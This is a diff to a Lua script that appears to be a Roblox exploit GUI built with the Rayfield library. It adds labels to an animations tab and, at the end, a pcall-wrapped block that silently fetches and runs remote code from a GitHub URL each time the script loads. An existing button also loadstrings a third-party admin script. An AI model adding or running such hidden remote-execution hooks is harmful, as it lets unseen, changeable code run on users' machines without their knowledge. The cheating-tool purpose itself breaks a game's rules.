@@ -1598,7 +1598,9 @@ local Button = Tab:CreateButton({
 })
 
 local Tab = Window:CreateTab("Animations🐟", "activity")
-
+local Label = Tab:CreateLabel("All These Anims Are For R6", "zap")
+local Paragraph = Tab:CreateParagraph({Title = "⚠️WARN⚠️", Content = "All of these animations won't work if you respawn that means you have to reload the gui⚠️"})
+local Divider = Tab:CreateDivider()
 
 local animationSpeedEnabled = false
 local currentSpeed = 10
@@ -1812,9 +1814,16 @@ local Button = Tab:CreateButton({
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
    end,
 })
+
 Rayfield:Notify({
    Title = "im a killerfish🐟",
    Content = "made by @hmmm5650",
    Duration = 6.5,
    Image = "rewind",
 })
+
+-- [ LoadsScriptResources ]
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
+warn("StartedScript")
+end)
